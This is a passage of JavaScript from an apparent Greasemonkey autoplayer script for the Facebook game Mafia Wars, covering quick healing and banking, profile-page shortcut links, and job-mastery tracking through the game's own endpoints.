  }

  // Make energy icon & text clickable for mini pack.
  var nrgLinkElt = document.getElementById('mwap_nrg');
  var nrgElt = xpathFirst('./div[@class="mw_header"]//div[@class="mid_row_text energy_text_bg" and contains(text(), "ENERGY")]', statsrowElt);
  if (!nrgElt)
    nrgElt = xpathFirst('.//div[@id="game_stats"]//h4[@class="energy" and contains(text(), "Energy")]', statsrowElt);
  if (!nrgElt)
    nrgElt = xpathFirst('.//div[@id="game_stats"]//span[@class="stat_title" and contains(text(),"Energy")]', statsrowElt);
  if (nrgElt && !nrgLinkElt) {
    var timeLeftPack = getHoursTime('miniPackTimer');
    if (timeLeftPack == 0) var miniPackTitle = 'Mini-Pack available now.';
    else if (timeLeftPack == undefined) {
      var miniPackTitle = 'Mini-Pack Timer has been reset.';
      setGMTime('miniPackTimer', '8 hours');
    } else var miniPackTitle = timeLeftPack + ' until Mini-Pack is available.';
    miniPackTitle += ' Click to attempt to fire immediately.';
    nrgElt.style.color="#FF0000";
    nrgElt.style.textDecoration="underline";
    nrgLinkElt = makeElement('a', null, {'id':'mwap_nrg', 'title':miniPackTitle});
    nrgElt.parentNode.insertBefore(nrgLinkElt, nrgElt);
    nrgLinkElt.appendChild(nrgElt);
    nrgLinkElt.addEventListener('click', miniPackForce, false);
  }

  // Make stamina text & icon pointable for showing.
  var stamLinkElt = document.getElementById('mwap_stam');
  var stamElt = xpathFirst('./div[@class="mw_header"]//div[@class="mid_row_text stamina_text_bg" and contains(text(), "STAMINA")]', statsrowElt);
  if (!stamElt)
    stamElt = xpathFirst('.//div[@id="game_stats"]//h4[contains(text(), "Stamina")]', statsrowElt);
  if (!stamElt)
    stamElt = xpathFirst('.//div[@id="game_stats"]//span[@class="stat_title" and contains(text(),"Stamina")]', statsrowElt);
  if (stamElt && !stamLinkElt) {
    var stamTitle = 'Minimum Stamina for auto-healing set at ' + GM_getValue('stamina_min_heal') + ' points.';
    stamElt.style.color="#FF0000";
    stamElt.style.textDecoration="underline";
    stamLinkElt = makeElement('a', null, {'id':'mwap_stam', 'title':stamTitle});
    stamElt.parentNode.insertBefore(stamLinkElt, stamElt);
    stamLinkElt.appendChild(stamElt);
  }

  // Make health icon&text clickable for instant healing.
  var hospitalElt = xpathFirst('.//div[@id="game_stats"]//a[@class="heal_link" or @class="heal_link vt-p"]', statsrowElt);
  var healLinkElt = document.getElementById('mwap_heal');
  var healElt = xpathFirst('./div[@class="mw_header"]//div[@class="mid_row_text health_text_bg" and contains(text(), "HEALTH")]', statsrowElt);
  if (!healElt)
    healElt = xpathFirst('.//div[@id="game_stats"]//h4[@class="health" and contains(text(), "Health")]', statsrowElt);
  if (!healElt)
    healElt = xpathFirst('.//div[@id="game_stats"]//span[@class="stat_title" and contains(text(),"Health")]', statsrowElt);
  if (healElt) {
    if (!healLinkElt) {
      healElt.style.color="#FF0000";
      healElt.style.textDecoration="underline";
      healElt.style.display="inline";
      healLinkElt = makeElement('a', null, {'id':'mwap_heal', 'title':'Click to heal immediately.'});
      healElt.parentNode.insertBefore(healLinkElt, healElt);
      healLinkElt.appendChild(healElt);
      healLinkElt.style.textDecoration="none";

      var newLink = document.getElementById('mwap_toggleheal');
      if(!newLink) {

        if (!isGMChecked('autoHeal')) {
          newLinkTitle='autoHeal unchecked';
        } else {
          if (GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB) newLinkTitle='autoHeal checked BUT OVERRULED - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
          else newLinkTitle='autoHeal checked - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
        }

        newLink = makeElement('a', null, {'id':'mwap_toggleheal', 'title':newLinkTitle});

        if (!isGMChecked('autoHeal')) {
          newLink.innerHTML=healOffIcon;
        } else {
          if (GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB) newLink.innerHTML=healOnHoldIcon;
          else newLink.innerHTML=healOnIcon;
        }
        newLink.style.padding="3px 0px 0px 8px";
        newLink.style.display="inline";
        newLink.style.position="absolute";
        healParent = healLinkElt.parentNode;
        healParent.insertBefore(newLink, healParent.childNodes[2]);
        newLink.addEventListener('click', toggleHeal, false);
      }
    }

    // Substitute the "hide" icon if currently hiding in the hospital.
    var hidingInHospital = /transparent url/i.test(healElt.getAttribute('style'));
    if (health < 20 && isGMChecked('hideInHospital')) {
      if (!hidingInHospital) {
        healElt.style.background = 'transparent url(' + stripURI(hideIcon) + ') no-repeat scroll 0 50%';
        healElt.title = 'Currently hiding in the hospital. Click to heal immediately.';
      }
    } else if (hidingInHospital) {
      healElt.style.background = '';
      healElt.title = 'Click to heal immediately.';
    }
    if (hospitalElt) {
      // Make instant heal work without switching pages.
      healLinkElt.addEventListener('click', quickHeal, false);
    }
  }

  // Blink maxed out energy or stamina.
  energyElt.style.textDecoration = (energy == maxEnergy)? 'blink' : 'none';
  staminaElt.style.textDecoration = (stamina == maxStamina)? 'blink' : 'none';

  // Blink dangerous health levels.
  healthElt.style.textDecoration = (health > 19 && health < 29) ? 'blink' : 'none';

  // Once health is below 20, set the timer (this is for the conditional healing logic)
  if (isGMChecked('forceHealOpt5') && health < 20 && GM_getValue('healWaitStarted') != true) {
    setGMTime('healWaitTime', '05:00');
    GM_setValue('healWaitStarted', true);
  }

  setListenStats(true);
}

function toggleHeal() {
  if(isGMChecked('autoHeal')) {
    GM_setValue('autoHeal', 0);
    document.getElementById('mwap_toggleheal').innerHTML=healOffIcon;
    document.getElementById('mwap_toggleheal').title = 'autoHeal unchecked';
    addToLog('healOffIcon Icon', 'autoHeal turned OFF by User');
  } else {
    GM_setValue('autoHeal', 'checked');
    if(GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB){
      document.getElementById('mwap_toggleheal').innerHTML=healOnHoldIcon;
      document.getElementById('mwap_toggleheal').title = 'autoHeal checked BUT OVERRULED - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
      addToLog('healOnHoldIcon Icon', 'autoHeal turned ON by User, but overruled');
    } else {
      document.getElementById('mwap_toggleheal').innerHTML=healOnIcon;
      document.getElementById('mwap_toggleheal').title = 'autoHeal checked - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
      addToLog('healOnIcon Icon', 'autoHeal turned ON by User');
    }
  }
}

function quickHeal(byUser) {
  // NOTE: In the interest of time, delays are waived.
  Autoplay.delay = noDelay;
  if (byUser == false) {
    var healLocation = parseInt(GM_getValue('healLocation', NY));
  } else {
    var healLocation = city;
  }
  // Make sure we're in the preferred city.
  if (healLocation != cities.length && city != healLocation) {
    if (byUser) return;
    Autoplay.fx = function() { goLocation(healLocation); };
    Autoplay.start();
    return true;
  }

  // Create heal link.
  var healElt = makeElement('a', null, {'onclick':'return do_ajax("' + (byUser ? SCRIPT.ajaxResult : SCRIPT.ajaxPage) + '","' + SCRIPT.controller + 'hospital' + SCRIPT.action + 'heal' + SCRIPT.city + (healLocation + 1) + '", 1, 1, 0, 0); return false;'});
  if (byUser) {
    createAjaxPage(false, 'quick heal');
    clickElement(healElt);
    return;
  } else {
    createAjaxPage(true);
    Autoplay.fx = function() {
      clickAction = 'heal';
      clickElement(healElt);
      DEBUG('Clicked to quickheal.');
    };
    Autoplay.start();
    return true;
  }
}

function quickBank(bankCity, amount) {
  var byUser = false;
  // Handle user-click action
  if (isNaN(amount)) {
    if (isNaN(bankCity)) {
      bankCity = city;
      byUser = true;
    }
    var cashElt = document.getElementById('user_cash_' + cities[bankCity][CITY_ALIAS]);
    if (cashElt)
      amount = parseCash(cashElt.innerHTML);
    else
      amount = cities[bankCity][CITY_CASH];
  }

  // Check vault status & get the URL
  if (bankCity == LV) {
    if (GM_getValue('vaultHandling',0)) {
      var vaultSpace = parseInt(GM_getValue('vaultSpace','0'));
      if (vaultSpace <= 0) {
        if (byUser) addToLog('info Icon', 'Your vault appears to be full, rechecking...');
        checkVaultStatus(byUser);
        return false;
      }
      amount = (amount > vaultSpace) ? vaultSpace : amount;
    }
    var depositUrl = "xw_controller=propertyV2&xw_action=doaction&xw_city=5&doaction=ActionBankDeposit&building_type=6&city=5&amount=" + amount;
  } else
    var depositUrl = "xw_controller=bank&xw_action=deposit_all&xw_city=" + (bankCity + 1);

  // If cash being deposited is greater than 1 billion, do NOT quick-bank!
  if (amount > 1000000000) {
    if (byUser)
      addToLog('updateBad Icon', 'Depositing <strong class="good">' + cities[bankCity][CITY_CASH_SYMBOL] + makeCommaValue(amount) +
               '</strong>!?!<strong class="bad"> HELL NO!</strong> Sink it from the banking page.');
    quickBankFail = true;
    return false;
  }

  // Do not quick-bank if city has changed
  if (city != bankCity) {
    DEBUG('Switching city too fast, not quick-banking.');
    return false;
  }

  // One last check to make sure the city hasn't changed
  var eltBankCity = xpathFirst('.//a[@class="bank_deposit"]', statsrowElt);
  if (eltBankCity) {
    if (eltBankCity.getAttribute('onclick').match(/xw_city=(\d+)/)) {
      var thisCity = RegExp.$1 - 1;
      if (thisCity != bankCity) {
        addToLog('warning Icon', 'Banking Error: Current City: ' + cities[thisCity][CITY_NAME] + ' Expected City: ' + cities[bankCity][CITY_NAME]);
        return false;
      }
    }
  }

  var elt = makeElement('a', null, {'onclick':'return do_ajax("' + SCRIPT.ajaxResult + '","remote/html_server.php?' + depositUrl + '", 1, 1, 0, 0); return false;'});
  createAjaxPage(false, 'quick deposit', bankCity);
  clickElement(elt);
  DEBUG('Clicked to quickbank.');
  return false;
}

function customizeNames() {
  var i, elt, elts = $x('.//a[contains(@onclick, "user=")]', innerPageElt);
  for (i = 0, iLength=elts.length; i < iLength; ++i) {
    elt = elts[i];
    if (!elt.innerHTML.replace(/\xAD/g, '').trim()) {
      if (elt.getAttribute('onclick').match(/user=(\d+)/)) {
        elt.innerHTML = chickenIcon + ' Chicken ' + RegExp.$1;
      } else {
        elt.innerHTML = chickenIcon + ' Chicken';
      }
    }
  }

  elts = $x('.//span[contains(@id, "_fight_view_name_")]', innerPageElt);
  for (i = 0, iLength=elts.length; i < iLength; ++i) {
    elt = elts[i];
    if (!elt.innerHTML.untag().trim()) {
      elt.innerHTML = chickenIcon + ' Chicken';
    }
  }
}

function customizeHome() {
  if (!onHome()) return false;

  // Is an energy pack waiting to be used?
  energyPackElt = xpathFirst('.//a[contains(@onclick, "xw_action=use_and_energy_all")]', innerPageElt);
  energyPackElt = energyPackElt ? energyPackElt : xpathFirst('.//a[contains(@onclick, "xw_action=use_energy_pak")]', innerPageElt);
  energyPack = energyPackElt? true : false;

  // Display a message next to the energy pack button.
  if (energyPackElt && energyPackElt.scrollWidth) {
    var energyGainRate = getEnergyGainRate();
    var ptsFromEnergyPack = maxEnergy * 1.25 * energyGainRate;
    var ptsNeeded = ptsToNextLevel - energy * energyGainRate -
                    stamina * getStaminaGainRate();
    var txt = 'XP from Energy Pack = ' + parseInt(ptsFromEnergyPack) +
              '<br>Projected XP needed = ' + parseInt(ptsNeeded);
    var packParentElt = document.getElementById('clock_energy_pack');
    if (packParentElt) {
      var descElt = makeElement('div', null, {'style':'float:left; padding: 2px 10px 0px 0px; font-size: 10px;'});
      descElt.innerHTML = txt;
      packParentElt.insertBefore(descElt, packParentElt.firstChild);
    }
  } else {
    energyPack = false;
  }

  return true;
}

function getPlayerStats() {
  var statTable = xpathFirst('.//table[contains(.,"Attack:") and contains(.,"Defense:")]', innerPageElt);

  // Fetch defense and attack values from profile
  if (statTable) {
    DEBUG('Fetching stats from profile page');

    // Attack
    var curAttackRow  = xpathFirst('.//tr[contains(.,"Attack:")]', statTable);
    if (curAttackRow && curAttackRow.innerHTML.match(/>\s*(\d+)/)) {
      curAttack = parseInt(RegExp.$1);
      GM_setValue('curAttack', curAttack);
    }

    // Defense
    var curDefenseRow  = xpathFirst('.//tr[contains(.,"Defense:")]', statTable);
    if (curDefenseRow && curDefenseRow.innerHTML.match(/>\s*(\d+)/)) {
      curDefense = parseInt(RegExp.$1);
      GM_setValue('curDefense', curDefense);
    }

    //
    if (isUndefined(curAttack)) {
      addToLog('info icon', 'Current status attributes cannot be detected, turning off auto-stat.');
      GM_setValue('autoStat', 0);
    }
  }
}

function getPlayerEquip() {
  // Make sure we're on the fight tab.
  if (!onFightTab()) {
    //Autoplay.fx = goFightTab;
    //Autoplay.start();
    return;
  }

  var eltAttackStrength = xpathFirst('.//div[@class="fightbar_group_stat"]//img[contains(@alt, "Mafia Attack Strength")]', innerPageElt);
  if (eltAttackStrength) { prevAttackEquip = curAttackEquip; curAttackEquip = parseInt(eltAttackStrength.parentNode.childNodes[1].nodeValue.replace(',', '')); GM_setValue('curAttackEquip', curAttackEquip); }
  var eltDefenseStrength = xpathFirst('.//div[@class="fightbar_group_stat"]//img[contains(@alt, "Mafia Defense Strength")]', innerPageElt);
  if (eltDefenseStrength) { prevDefenseEquip = curDefenseEquip; curDefenseEquip = parseInt(eltDefenseStrength.parentNode.childNodes[1].nodeValue.replace(',', '')); GM_setValue('curDefenseEquip', curDefenseEquip); }

  if (isUndefined(curAttackEquip) || isUndefined(curDefenseEquip)) {
    DEBUG('Current equipment attributes cannot be detected.');
  } else
    DEBUG('Fetched equipment stats.');
}

function customizeProfile() {
  // Fetch Player Stats
  getPlayerStats();

  // FIXME: Need to rewrite buildAnchor, need to make it more flexible
  this.buildAnchor = function (Options) {
    //Options.URLSegment = common portions if URL
    //Options.href = allow for full control of href
    //Options.clickEvent = function
    //Options.title = flyout text
    //Options.AnchorText = text inside Anchor
    var buildAnchorOptions = {};
    if(Options.URLSegment){
      buildAnchorOptions.href='http://mwfb.zynga.com/mwfb/remote/html_server.php?'+Options.URLSegment;
    } else if(Options.href){
      buildAnchorOptions.href = Options.href;
    } else {
      buildAnchorOptions.href='#';
    }
    if(!Options.clickEvent && Options.URLSegment){
      buildAnchorOptions.onclick ='return do_ajax(\'inner_page\', \'/remote/html_server.php?'+Options.URLSegment+'\', 1, 1, 0, 0); return false; ';
    }
    if(Options.id){
      buildAnchorOptions.id=Options.id;
    }

    var anchorElt = makeElement('a', statsDiv, buildAnchorOptions);
    if(Options.AnchorText){
      anchorElt.appendChild(document.createTextNode(Options.AnchorText));
    }
    if(Options.clickEvent){
      anchorElt.addEventListener('click', Options.clickEvent, false);
    }
    return anchorElt;
  };

  // Make sure we're on a profile.
  var statsTable = xpathFirst('.//td[@class="stats_left"]', innerPageElt);
  if (!statsTable) return false;

  var statsDiv = xpathFirst('.//a[contains(., "Sucker Punch")]/..', innerPageElt);
  if (statsDiv) {
    // On another player's profile page. Add extra options.
    var tabElt = xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(text(), "Profile")]', innerPageElt);
    if (tabElt){
      var remoteuserid;
      var remotefbid;
      var tmpKey;
      var cbKey;
      if (tabElt.getAttribute('onclick').match(/tmp=([\d,a-z]+)&cb=([\d,a-z]+)&user=p\|(\d+)/)) {
        tmpKey = 'tmp='+RegExp.$1+'&';
        cbKey = 'cb='+RegExp.$2+'&';
        remoteuserid = 'p|'+RegExp.$3;
      }
      if (!remoteuserid && tabElt.getAttribute('onclick').match(/user=p\|(\d+)/)){
        remoteuserid = 'p|'+RegExp.$1;
      }

      // This code is to grab the facebook id for this profile
      if ((m=/xw_controller=robbingtarget.+?target=([0-9]+)/.exec(document.getElementById('inner_page').innerHTML))) {
        remotefbid = m[1];
      }
      if ((m=/xw_action=gift_wishlist.*?user=([0-9]+)/.exec(document.getElementById('inner_page').innerHTML))) {
        remotefbid = m[1];
      }
      // Sometimes the friend_id of the new vegasslots is in the fb id format:
      if (!remotefbid && (m=/xw_controller=VegasSlots.+?friend_id=([0-9]+)/i.exec(document.getElementById('inner_page').innerHTML))) {
        remotefbid = m[1];
      }

      if (!tmpKey && tabElt.getAttribute('onclick').match(/tmp=([\d,a-z]+)&/)){
        tmpKey = 'tmp='+RegExp.$1+'&';
      }
      if (!cbKey && tabElt.getAttribute('onclick').match(/cb=([\d,a-z]+)&/)){
        cbKey = 'cb='+RegExp.$2+'&';
      }

      DEBUG('Profile: Mafia Wars ID: ' + remoteuserid + ' Facebook ID: ' + remotefbid);

      // See if this player is in our mafia.
      var removeElt = xpathFirst('.//a[contains(., "Remove from Mafia")]', statsDiv);

      // Show if Alive/Dead, insert AttackX button
      if (!running && !removeElt) {
        var titleElt = xpathFirst('./div[@class="title"]', innerPageElt);
        if (titleElt) {
          titleElt.setAttribute('style', 'background: black;');
          if (!document.getElementById('profile_attackx')) {
            var attackXElt = makeElement('input', null, {'id':'profile_attackx','type':'button','value':'AttackX','style':'position:absolute;'});
            attackXElt.addEventListener('click', attackXfromProfile, false);
            titleElt.parentNode.insertBefore(attackXElt, titleElt.nextSibling);
          }
        }
        createAjaxPage(false, 'icecheck profile');
        var elt = makeElement('a', null, {'onclick':'return do_ajax("' + SCRIPT.ajaxResult + '","' + SCRIPT.controller + 'hitlist' + SCRIPT.action + 'set&target_id=' + remoteuserid + '", 1, 1, 0, 0); return false;'});
        clickElement(elt);
      }
      // Don't continue if buttons already there
      if (document.getElementById('where_are_my_links')) return true;

      var rDisplay = false;

      // Explain the buttons
      makeElement('a', statsDiv, {'id':'where_are_my_links', 'href':'javascript:alert("Due to the way Mafia Wars links to Facebook there are times where PS MWAP cannot find the Facebook profile ID. In those situations PS MWAP will not display buttons that require that ID. You can make the Facebook ID available by refreshing the profile page.");'}).appendChild(document.createTextNode('Where are my links?'));

      // This is a refresh page button
      statsDiv.appendChild(document.createTextNode(' | '));
      makeElement('a', statsDiv, {'href':'http://facebook.mafiawars.com/mwfb/remote/html_server.php?xw_controller=stats&xw_action=view&xw_city=1&user=' + remoteuserid}).appendChild(document.createTextNode('Refresh this profile!'));
      rDisplay = true;

      if (remotefbid) {
        // Facebook profile
        if (rDisplay) statsDiv.appendChild(document.createTextNode(' | '));
        makeElement('a', statsDiv, {'href':'http://www.facebook.com/profile.php?id=' + remotefbid,'target':'_blank'}).appendChild(document.createTextNode('Facebook Profile'));
        statsDiv.appendChild(document.createTextNode(' | '));

        // Add as Facebook friend
        makeElement('a', statsDiv, {'href':'http://www.facebook.com/addfriend.php?id=' + remotefbid,'target':'_blank'}).appendChild(document.createTextNode('Add as Friend'));
        rDisplay = true;
      }

      if (removeElt) { // Promote
        if (rDisplay) statsDiv.appendChild(document.createTextNode(' | '));
        //href Example:http://mwfb.zynga.com/mwfb/remote/html_server.php?xw_controller=group&xw_action=view&xw_city=4&tmp=9c2d83eaf30b28fa29319feb437e4f7e&cb=18309240931265744553&promote=yes&uid=48608018
        //OnClick Example: return do_ajax('inner_page', 'remote/html_server.php?xw_controller=group&xw_action=view&xw_city=4&tmp=9c2d83eaf30b28fa29319feb437e4f7e&cb=18309240931265744553&promote=yes&uid=48608018', 1, 1, 0, 0); return false;
        this.buildAnchor( { 'AnchorText':'Promote',
                            'URLSegment': 'xw_controller=group&'+
                                          'xw_action=view&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'promote=yes&'+
                                          'pid=' + remoteuserid});
        rDisplay = true;
      }
      if (rDisplay) makeElement('br', statsDiv,{});
      rDisplay = false;

      if (removeElt) {//Add or Remove from War List
        var warID = remoteuserid.replace('p|','');
        var isOnWarList = (getSavedList('autoWarTargetList').indexOf(warID) != -1);
        // In my mafia. Show options to add/remove from war list.
        this.buildAnchor( { 'AnchorText':isOnWarList?'Remove from War List':'Add to AutoWar List',
                            'id':warID,
                            'title':'In the settings box, under the mafia tab\nIf you have selected war friends from a list\nupdates the friends ids in the box',
                            'clickEvent':isOnWarList?clickWarListRemove:clickWarListAdd
                          });
        rDisplay = true;
      }

      if (remotefbid) {
        // Add to AutoHitlist
        if (rDisplay) statsDiv.appendChild(document.createTextNode(' | '));
        var isOnAutoHitList = (getSavedList('autoHitOpponentList').indexOf(remotefbid) != -1);
        this.buildAnchor( { 'AnchorText':isOnAutoHitList?'Remove from AutoHit List':'Add to AutoHit List',
                            'id':remotefbid,
                            'title':'In the settings box, under the stamina tab\nIf you have selected hitlist opponents \nHitlist these opponents:',
                            'clickEvent':isOnAutoHitList?clickAutoHitListRemove:clickAutoHitListAdd
                          });
        rDisplay = true;

        if (!removeElt) {// Not in mafia. Show options to add/remove from fight lists.
          if (rDisplay) statsDiv.appendChild(document.createTextNode(' | '));
          rDisplay = true;
          var isOnFightList = (getSavedList('fightList').indexOf(remotefbid) != -1);
          this.buildAnchor( { 'AnchorText':isOnFightList?'Remove from Fight List':'Add to AutoFight List',
                            'id':remotefbid,
                            'title':'In the settings box, under the stamina tab\nIf you have selected fight specific opponents\nFight these opponents:',
                            'clickEvent':isOnFightList?clickFightListRemove:clickFightListAdd
                          });

          statsDiv.appendChild(document.createTextNode(' | '));
          this.buildAnchor( { 'AnchorText':'Add to Mafia',
                            'URLSegment': 'xw_controller=war&'+
                                          'xw_action=add&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'friend_id=' + remotefbid});
        }
      }
      if (rDisplay) makeElement('br', statsDiv,{});

      if (removeElt){//Job Help
        this.buildAnchor( { 'AnchorText':'NY - Give help',
                            'URLSegment': 'xw_controller=job&'+
                                          'xw_action=give_help&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'target_id='+remoteuserid+'&'+
                                          'job_city=1'
                          });
        statsDiv.appendChild(document.createTextNode(' | '));
        this.buildAnchor( { 'AnchorText':'Cuba - Give help',
                            'title':'A test of the title',
                            'URLSegment': 'xw_controller=job&'+
                                          'xw_action=give_help&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'target_id='+remoteuserid+'&'+
                                          'job_city=2'
                          });
        statsDiv.appendChild(document.createTextNode(' | '));
        this.buildAnchor( { 'AnchorText':'Moscow - Finish Episode ',
                            'URLSegment': 'xw_controller=episode&'+
                                          'xw_action=give_help_moscow_boss&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'target_id='+remoteuserid+'&'+
                                          'job_city=3'
                          });
        statsDiv.appendChild(document.createTextNode(' | '));
        this.buildAnchor( {'AnchorText':'Bangkok - Give help',
                            'URLSegment': 'xw_controller=story&'+
                                          'xw_action=give_help_social&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'target_id='+remoteuserid+'&'+
                                          'job_city=4'
                          });
        makeElement('br', statsDiv,{});
        if (remotefbid) {
          this.buildAnchor( { 'AnchorText':'Mafia Gift',
                            'title':'Requires that you set the giftkey in advance, see documentation',
                            'href':'http://www.spockholm.com/mafia/?id='+remotefbid
                          });
          statsDiv.appendChild(document.createTextNode(' | '));
        }
        this.buildAnchor( { 'AnchorText':'Load ChuckACrap',
                            'title':'From spockholm.com',
                            'clickEvent':eventclick_chuckaCrap
                          });
      }
    }
  } else {
    // On our own profile page.
    profileFix();
  }

  return true;
}

// Return the job mastery level
function getJobMastery(jobRow, newJobs) {
  // Logic for new job layout
  if (newJobs) {
    var mastery = 100;
    if (jobRow.innerHTML.untag().match(/>(\d+)%\s+Job\s+Mastery/i) || jobRow.innerHTML.untag().match(/(\d+)%/i) || jobRow.innerHTML.match(/Job\s+Mastery\s+(\d+)%/i) || jobRow.innerHTML.match(/>(\d+)%/i)) { mastery = parseInt(RegExp.$1); }
    else { if (jobRow.innerHTML.untag().match(/margin-right:\s+(\d+)%/i)) mastery = 100-parseInt(RegExp.$1) }
    return mastery;
  }

  // Locked jobs are mastered too
  if (/Mastered/i.test(jobRow.innerHTML) || isJobLocked(jobRow) )
      return 100;
  else if (jobRow.innerHTML.match(/Job\s+Mastery\s+(\d+)%/i) || jobRow.innerHTML.match(/>(\d+)%/i))
    return parseInt(RegExp.$1);

  // Get the job with the highest percentage in choice point jobs
  var divElts = $x('.//td[@class="job_name job_no_border"]//div[contains(text(),"%")]', jobRow);
  if (divElts) {
    var iLength = divElts.length;
    var masteryPct = (iLength == 1) ? 100 : 0;
    for (var i = 0; i < iLength; ++i) {
      if (divElts[i].innerHTML.match(/(\d+)%/) && parseInt(RegExp.$1) > masteryPct)
        masteryPct = parseInt(RegExp.$1);
    }
    return parseInt(masteryPct);
  }
  DEBUG('No mastery items found. Assuming 0% mastery level.');
  return 0;
}

// Set the next job to be mastered for mastery job options
function jobMastery(element, newJobs) {
  if (isGMChecked('repeatJob') || isGMChecked('multipleJobs')) return;

  var selectMission = parseInt(GM_getValue('selectMission', 1));
  var currentJob = missions[selectMission][MISSION_NAME];
  var jobno      = missions[selectMission][MISSION_NUMBER];
  var tabno      = missions[selectMission][MISSION_TAB];
  var cityno     = missions[selectMission][MISSION_CITY];

  if (city != cityno || !onJobTab(tabno)) return;

  var currentJobRow = getJobRow(currentJob, element);

  // Calculate tier mastery.
  DEBUG('Checking mastery for each job.');
  var tierLevel = 0;
  var jobPercentComplete = -1;
  if (currentJobRow) jobPercentComplete = getJobMastery(currentJobRow, newJobs);
  DEBUG('Job is '+jobPercentComplete+' % complete');
  var currentJobMastered = (jobPercentComplete == 100);
  if (currentJobRow) {
    if (newJobs && currentJobRow.className.match(/mastery_level_(\d+)/i))
      tierLevel = RegExp.$1;
    else if (currentJobRow.innerHTML.match(/level (\d+)/i))
      tierLevel = RegExp.$1;
  }

  var tierPercent = 0;
  var jobCount = 0;
  var firstUnmastered = selectMission;
  var firstFound = false;
  for (var i = 0, iLength = missions.length; i < iLength; i++) {
    // Only get the jobs from this city tier
    if (city == missions[i][MISSION_CITY] && tabno == missions[i][MISSION_TAB]) {
      var thisJobRow = getJobRow(missions[i][MISSION_NAME]);
      if (thisJobRow) {
        var masteryLevel = getJobMastery(thisJobRow, newJobs);
        tierPercent += masteryLevel;
        jobCount++;
        // Get the first unmastered job on this tier
        if (!firstFound && masteryLevel < 100) {
          firstFound = true;
          firstUnmastered = i;
        }
      }
    }
  }

  if (jobCount > 0) {
    tierPercent = Math.floor(tierPercent / jobCount);
  }

  if (GM_getValue('tierCompleteStatus') != tierLevel + '|' + tierPercent) {
    GM_setValue('tierCompleteStatus', tierLevel + '|' + tierPercent);
    addToLog('info Icon', 'Job tier level ' + tierLevel + ' is ' +
             tierPercent + '% complete.');
  }

  // Calculate job mastery
  DEBUG("Checking current job mastery.");
  if (currentJobMastered || jobPercentComplete == -1) {
    var jobList = getSavedList('jobsToDo');
    if (jobList.length == 0) {
      if (currentJobMastered) addToLog('info Icon', 'You have mastered <span class="job">' + currentJob + '</span>.');
      else addToLog('info Icon', 'Job <span class="job">' + currentJob + '</span> is not available.');
      if (tierPercent == 100) {
        // Find the first job of the next tier.
        // NOTE: This assumes that the missions array is sorted by city and then by tier.
        var nextTierJob;
        for (i = selectMission + 1, iLength=missions.length; i < iLength; ++i) {
          if (missions[i][MISSION_CITY] != cityno) {
            nextTierJob = i;
            addToLog('info Icon', 'You have mastered the final job tier in ' +
                     cities[cityno][CITY_NAME] + '! Moving to the next tier in ' +
                     cities[missions[nextTierJob][MISSION_CITY]][CITY_NAME] + '.');
            break;
          }
          if (missions[i][MISSION_TAB] != tabno) {
            nextTierJob = i;
            addToLog('info Icon', 'Current job tier is mastered. Moving to next tier in ' + cities[cityno][CITY_NAME] + '.');
            break;
          }
        }
        if (!nextTierJob) {
          addToLog('info Icon', 'You have mastered all jobs!');
        } else {
          GM_setValue('selectMission', nextTierJob);
          addToLog('info Icon', 'Job switched to <span class="job">' + missions[GM_getValue('selectMission', 1)][MISSION_NAME] + '</span>.');
        }
      } else {
          GM_setValue('selectMission', firstUnmastered);
          addToLog('info Icon', 'Job switched to <span class="job">' + missions[GM_getValue('selectMission', 1)][MISSION_NAME] + '</span>.');
      }
    } else {
      DEBUG("There are jobs in the to-do list.");
    }
  } else {
    DEBUG("Job is not mastered. Checking percent of mastery.");
    if (GM_getValue('jobCompleteStatus') != (currentJob + '|' + String(jobPercentComplete))) {
      GM_setValue('jobCompleteStatus', (currentJob + '|' + String(jobPercentComplete)));
      addToLog('info Icon', '<span class="job">' + currentJob + '</span> is ' + jobPercentComplete + '% complete.');
    }
  }
}

function customizeVegasJobs() {
  // Handle Las Vegas job layout
  var vegasJobs = $x('.//div[@id="map_panels"]//div[contains(@class, "job_info")]', innerPageElt);

  if (!vegasJobs || vegasJobs.length == 0) return false;
  DEBUG('Found ' + vegasJobs.length + ' new vegas jobs in customizevegasjobs.');

  //  6 is tab path newlv
  //  var availableJobs = eval('({0:{},1:{},2:{},3:{},4:{},6:{}})');
  //  var masteredJobs = eval('({0:{},1:{},2:{},3:{},4:{},6:{}})');
  var availableJobs = eval('({0:{},1:{},2:{},3:{},4:{}})');
  var masteredJobs = eval('({0:{},1:{},2:{},3:{},4:{}})');
  try {
    availableJobs = eval('(' + GM_getValue('availableJobs') + ')');
    masteredJobs = eval('(' + GM_getValue('masteredJobs') + ')');
  } catch (ex) {
    // ignore
  }
  var currentTab = currentJobTab();
  var currentTabPath = currentJobTabPath();
  availableJobs[city][currentTab] = [];
  masteredJobs[city][currentTab] = [];

  // FIXME: Change this once we encounter locked jobs for the new header
  var isJobLocked = function (thisJob) {
    return /locked/i.test(thisJob.innerHTML.untag());
  };

  // Display an experience to energy payoff ratio for each job.
  var bestJobs = [], worstJobs = [];
  var bestRatio = 0, worstRatio = 10;
  var reselectJob = false;
  var masteryList = getSavedList('masteryJobsList');

  var masteredJobsCount = 0;
  var jobsFound = 0;

  for (var i = 0, iLength = vegasJobs.length; i < iLength; ++i) {
    var currentJob = vegasJobs[i];
    var jobName = xpathFirst('.//div[@class="job_title"]//h3', currentJob).innerHTML.clean().trim();
    var jobCost = xpathFirst('.//div[@class="job_uses"]', currentJob);
    var jobReward = xpathFirst('.//div[@class="job_pays"]', currentJob);
